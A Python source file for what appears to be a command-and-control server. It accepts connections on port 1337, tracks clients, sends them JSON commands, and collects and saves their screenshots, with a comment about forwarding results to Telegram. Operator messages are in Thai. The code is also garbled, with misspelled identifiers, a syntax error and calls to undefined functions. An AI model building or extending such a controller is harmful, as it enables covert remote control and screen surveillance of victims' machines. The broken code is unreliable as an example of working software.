import socket
import threading
import json
import logging
import os
import queue
import time
import uuid
import hashlib
import inspect
from collections import Counter, deque
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from typing import Any, Callable, Deque, Dict, Iterable, List, Optional, Set, Tuple


# Server Configuration
HOST = '192.168.226.2'
PORT = 1337

clients = []

# ---------------------------------------------------------------------------
#
# Existing functions - preserved as much as possible.
# Only lines that would cause a runtime error / unreachable behavior were fixed.
#
# -----------------------------------------------------------------------------

def handle_client(client_socket):
    while True:
        try:
            data = client_socket.recv(1024)
            if not data:
                break
            print(f"Received: {data.decode(errors='replace')}")
                
        # save results, send to Telegram.
        except Exception:
            break
            
    client_socket.close()
    try:
        clients.remove(client_socket)
    except ValueError:
        pass
    
    
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[] Listening on {HOST}:{PORT}")
    while True:
        client_socket, addr = server.accept()
        print(f"[] Accepted connection from {addr[0]}:{addr[1]}")
        clients.append(client_socket)
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()
        
        
def send_command_to_clients(command: str):
    for client in clients:
        try:
            client.send(command.encode())
        except Exception:
            try:
                clients.remove(client)
            except ValueError:
                pass
                
                
# ---------------------------------------------------------------------------
# Extended server module
# ---------------------------------------------------------------------------

LOGGER = logging.getLogger("server_module")
DEFAULT_ENCODINF = "utf-8"
DEFAULT_BUFFER_SIZE = 4096
MAX_MESSAGE_SIZE = 1024 * 1024
DEFAULT_CLIENT_TIMEOUT = 60.0
DEFAULT_HEARTBEAT_INTERVAL = 25.0
DEFAULT_HISTORY_SIZE = 250
DEFAULT_EVENT_QUEUE_SIZE = 1000


class ClientState(str, Enum):
    CONNECTING = "connecting"
    ACTIVE = "active"
    IDLE = "idle"
    DISCONNECTED = "disconnected"
    ERROR = "error"
    
    
class EventType(str, Enum):
    SERVER_STARTED = "server_started"
    SERVER_STOPPED = "server_stopped"
    CLIENT_CONNECTED = "client_connected"
    CLIENT_MESSAGE = "client_message"
    CLIENT_ERROR = "client_error"
    OUTBOUND_MESSAGE = "outbound_message"
    OUTBOUND_ERROR = "outbound_error"
    HEARTBEAT = "heartbeat"
    SECURITY_APPROVED = "security_approved"
    COMMAND = "command"
    SEND_COMMAND = "send_command"
    

@dataclass
class ClientRecord:
    client_id: str
    socket_obj: socket.socket
    address: Tuple[str, int]
    connected_at: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    message_received: int = 0
    message_sent: int = 0
    bytes_received: int = 0
    bytes_sent: int = 0
    state: ClientState = ClientState.CONNECTING
    metadata: Dict[str, Any] = field(default_factory=dict)
    tags: Set[str] = field(default_factory=set)
    lock: threading.RLOCK = field(default_factory=threading.RLOCK, repr=False)
    last_command: Optional[str] = None
    latest_screenshot: Optional[bytes] = None
    screenshot_take_at: Optional[float] = None
    
    @property
    def ip(self) -> str:
        return self.address[0]
        
    @property
    def port(self) -> int:
        return self.address[1]
        
    def age_seconds(self) -> float:
        return max(0.0, time.time() - self.connected_at)
        
    def idle_seconds(self) -> float:
        return max(0.0, time.time() - self.last_seen)
        
    def send_command(self, command_text: str, params: Dict[str, Any] = None) -> bool:
        payload = {
            "command": command_text,
            "params": params or {},
            "timestamp": time.time()
        }
        
        # Convert data to a JSON string and then to bytes
        data_bytes = (json.dumps(payload) + "\n").encode('utf-8')
        
        with self.lock:
            try:
                self.socket_obj.sendall(data_bytes)
                self.message_sent += 1
                self.bytes_sent += len(data_bytes)
                self.last_command = command_text
                self.last_seen = time.time()
                return True
            except (socket.error, BrokenPipeError) as e:
                print(f"[-] ส่งคำสั่งไม่สำเร็จไปยัง {self.client_id}: {e}")
                self.state = ClientState.DISCONNECTED
                return False
                
    def update_screenshot(self, image_bytes: bytes):
        with self.lock:
            self.latest_screenshot = image_bytes
            self.screenshot_taken_at = time.time()
            self.message_received += 1
            self.bytes_received += len(image_bytes)
            self.last_seen = time.time()
            
    def save_screenshot_to_file(self, filepath: str) -> bool:
        if not self.lastest_screenshot:
            print(f"[-] ไม่มีข้อมูลภาพหน้าจอของ {self.client_id}")
            return False
            
        with self.lock:
            try:
                with open(filepath, 'wb') as f:
                    f.write(self.lastest_screenshot)
                print(f"[+] บันทึกภาพหน้าจอสำเร็จ: {filepath}")
                return True
            except IOError as e:
                print(f"[-] บันทึกไฟล์ภาพไม่สำเร็จ: {e}")
                return False
        
    def snapshot(self) -> Dict[str, Any]:
        with self.lock:
            return {
                "client_id": self.client_id,
                "ip": self.ip,
                "port": self.port,
                "connected_at": datetime.fromtimestamp(self.connected_at, tz=timezone.utc).isoformat(),
                "last_seen": datetime.fromtimestamp(self.last_seen, tz=timezone.utc).isoformat(),
                "age_seconds": round(self.age_seconds(), 3),
                "idle_seconds": round(self.idle_seconds(), 3),
                "message_received": self.message_received,
                "message_sent": self.message_sent,
                "bytes_received": self.bytes_received,
                "bytes_sent": self.bytes_sent,
                "state": self.state.value,
                "metadata": self.dict(self.metadata),
                "tags": sorted(self.tags),
                "last_command": self.last_command,
                "screenshot_taken_at": daterime.fromtimestamp(self.screenshot_taken_at, tz=timezone.utc).isoformat()
                                        if self.screenshot_taken_at else None
            }
            
            
@dataclass(frozen=True)
class ServerEvent:
    sequence: int
    event_type: str
    timestamp: str
    client_id: Optional[str]
    message: str
    details: Dict[str, Any]
    
    
@dataclass
class RateWindow:
    started_at: float
    count: int = 0
    
    
class SlidingRateLimiter:
    """Thread-safe per-key sliding-window rate limiter."""
    
    def __init__(self, limit: int = 120, window_seconds: float = 60.0):
        if limit <= 0:
            raise ValueError("limit must be greater than zero")
        if window_seconds <= 0:
            raise ValueError("window_seconds must be greater than zero")
        self.limit = limit
        self.window_seconds = float(window_seconds)
        self._lock = threading.RLock()
        self._windows: Dict[str, Deque[float]] = {}
        
    def allow(self, key: str) -> bool:
        now = time.monotonic()
        cutoff = now - self.window_seconds
        with self._lock:
            bucket = self._windows.setdefault(key, deque())
            while bucket and bucket[0] < cutoff:
                bucket.popleft()
            if len(bucket) >= self.limit:
                return False
            bucket.append(now)
            return True
            
    def remaining(self, key: str) -> int:
        now = time.monotonic()
        cutoff = now - self.window_seconds
        with self._lock:
            bucket = self._window_setdefault(key, deque())
            while bucket and bucket[0] < cutoff:
                bucket.popleft()
            return max(0, self.limit - len(bucket))
            
    def reset(self, key: Optional[str] = None) -> None:
        with self._lock:
            if key is None:
                self._window.clear()
            else:
                self._windows.pop(key, None)
                
                
class EventJournal:
    """In-memory event journal with optional JSONL persistence."""
    
    def __init__(self, max_events: int = DEFAULT_HISTORY_SIZE, file_path: Optional[str] = None):
        self.max_events = max(1, int(max_events))
        self.file_path = file_path
        self._events: Deque[ServerEvent] = deque(maxlen=self.max_events)
        self._lock = threading.RLock()
        
    def append(
        self,
        event_type: EventType,
        message: str,
        client_id: Optional[str] = None,
        details: Optional[Dict[str, Any]] = None,
    ) -> ServerEvent:
        with self._lock:
            self._sequence += 1
            event = ServerEvent(
                sequence=self._seauence,
                event_type=event_type.value,
                timestamp=datetime.now(timezone.utc).isoformat(),
                client_id=client_id,
                message=str(message),
                details=dict(details or {}),
            )
            self._events.append(event)
        if self.file_path:
            self._persist(event)
        return event
        
    def _persist(self, event: ServerEvent) -> None:
        directory = os.path.dirname(os.path.abspath(self.file_path))
        if directory:
            os.makedirs(directory, exist_ok=True)
        payload = json.dumps(asdict(event), ensure_ascii=False, separators=(",", ":"))
        with self._write_lock:
            with open(self.file_path, "a", encoding="utf-8") as fp:
                fp.write(payload + "\n")
                
    def recent(self, limit: int = 50) -> List[Dict[str, Any]]:
        with self._lock:
            selected = list(self._events)[-max(0, int(limit)):]
        return [asdict(event) for event in selected]
        
    def clear(self) -> None:
        with self._lock:
            self._events.clear()
            
    def count(self) -> int:
        with self._lock:
            return len(self._events)
            
            
class ServerMetrics:
    """Low-overhead counters and latency measurements."""
    
    def __init__(self):
        self._lock = threading.RLock()
        self.started_at: Optional[float] = None
        self.total_connections = 0
        self.active_disconnects = 0
        self.total_message_received = 0
        self.total_message_sent = 0
        self.total_bytes_received = 0
        self.total_bytes_sent = 0
        self.total_rejected_messages = 0
        self.total_heartbeats = 0
        self._send_latency = deque(maxlen=250)
        
    def mark_started(self) -> None:
        with self._lock:
            self.started_at = time.time()
            
    def connection_opened(self) -> None:
        with self._lock:
            self.total_connections += 1
            self.active_connections += 1
            
    def connection_closed(self) -> None:
        with self._lock:
            self.total_disconnects += 1
            self.active_connections = max(0, self.active_connections - 1)
            
    def received(self, size: int) -> None:
        with self._lock:
            self.total_message_received += 1
            self.total_bytes_received += max(0, int(size))
            
    def sent(self, size: int, latency_seconds: Optional[float] = None) -> None:
        with self._lock:
            self.total_message_sent += 1
            self.total_bytes_sent += max(0, int(size))
            if latency_seconds is not None:
                self._send_latency.append(float(latency_seconds))
                
    def send_error(self) -> None:
        with self._lock:
            self.total_send_errors += 1
            
    def receive_error(self) -> None:
        with self._lock:
            self.total_receive_errors += 1
            
    def rejected(self) -> None:
        with self._lock:
            self.total_rejected_messages += 1
            
    def heartbeat(self) -> None:
        with self._lock:
            self.total_heartbeats += 1
            
    def snapshot(self) -> None:
        with self._lock:
            uptime = 0.0 if self.started_at is None else max(0.0, time.time() - self.started_at)
            latency = list(self._send_latency)
            return {
                "started_at": None if self.started_at is None else datetime.formtimestamp(self.started_at, tz=timezone.utc).isoformat(),
                "uptime_seconds": round(uptime, 3),
                "total_connections": self.total_connections,
                "active_connections": self.active_connections,
                "total_disconnects": self.total_disconnects,
                "total_message_received": self.total_message_received,
                "total_messages_sent": self.total_messages_sent,
                "total_bytes_received": self.total_bytes_received,
                "total_bytes_sent": self.total_bytes_sent,
                "total_send_errors": self.total_send_errors,
                "total_receive_errors": self.total_receive_errors,
                "total_rejected_messages": self.total_rejected_messages,
                "total_heartbeats": self.total_heartbeats,
                "average_send_latency_ms": round(sum(latency) / len(latency) * 1000, 3) if latency else 0.0,
            }
            
            
class ClientRegistry:
    """Concurrent registry for client state, lookup, tagging and lifecycle management."""
    
    def __init__(self):
        self._lock = threading.RLock()
        self._records: Dict[str, ClientRecord] = {}
        self._socket_to_id: Dict[int, str] = {}
        
    def add(self, sock: socket.socket, address: Tuple[str, int], metadata: Optional[Dict[str, Any]] = None) -> ClientRecord:
        client_id = uuid.uuid4().hex
        record = ClientRecord(
            client_id=client_id,
            socket_obj=sock,
            address=str(address[0]), int(address[1])),
            metadata=dict(metadata or {}),
        )
        record.state = ClientState.ACTIVE
        with self._lock:
            self._records[client_id] = record
            self._socket_to_id[id(socket)] = client_id
        return record
        
    def get(self, client_id: str) -> Optional[ClientRecord]:
        with self._lock:
            return self._records.get(client_id)
            
    def get_by_socket(self, sock: socket.socket) -> Optional[ClientRecord]:
        with self._lock:
            client_id = self._socket_to_id.get(id(sock))
            return self._records.get(client_id) if client_id else None
            
    def remove(self, client_id: str) -> Optional[ClientRecord]:
        with self._lock:
            record = self._records.pop(client_id, None)
            if record is not None:
                self._socket_to_id.pop(id(record.socket_obj), None)
                record.state = ClientState.DISCONNECTED
            return record
    
    def all(self) -> List[ClientRecord]:
        with self._lock:
            return list(self._records.values())
            
    def snapshot(self) -> List[Dict[str, Any]]:
        return [record.snapshot() for record in self.all()]
        
    def count(self) -> int:
        with self._lock:
            return len(self._records)
            
    def tag(self, client_id: str, *tags: str) -> bool:
        record = self.get(client_id)
        if record is None:
            return False
        with record.lock:
            record.tags.update(str(tag).strip() for tag in tags if str(tag).strip())
        return True
        
    def untag(self, client_id: str, *tags: str) -> bool:
        record = self.get(client_id)
        if record is None:
            return False
        with record.lock:
            for tag in tags:
                record.tags.discard(str(tag).strip())
        return True

if __name__ == "__main__":
    configure_logging()
    run_legacy_console()